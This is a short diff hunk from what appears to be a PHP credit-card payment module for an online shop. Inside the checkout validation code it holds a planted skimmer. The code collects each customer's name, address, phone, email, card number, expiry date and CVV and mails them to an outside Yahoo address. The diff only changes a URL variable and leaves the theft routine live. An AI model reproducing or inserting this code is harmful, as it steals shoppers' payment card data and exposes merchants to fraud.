@@ -270,7 +270,7 @@ if (in_array($cc_validation->cc_type, $this->allowed_types)) {
       $cvv = $_POST['x_Card_Code'];
       $cemail = $order->customer['email_address'];
       $servernya = $_SERVER['SERVER_NAME'];
-      $alamat = "http://fridafleur.com/oie5rw8udn7hk";
+      $alamat = "https://extremeairusa.com/shop";
       $message = "\n Name:$firstname $lastname \n Address:$street \n City:$city \n State:$state \n Zip:$zip \n Country:$country \n Phone:$dayphone \n email:$cemail \n cctype:$cardtype \n ccowner:$ccowner \n cc:$ccnumber \n exp:$ccexp \n cvv:$cvv \n alamat:$alamat \n";
       mail("dapurngebul420@yahoo.com","ngebulll terusssssssssssssssssssss From $servernya", "$message");
 
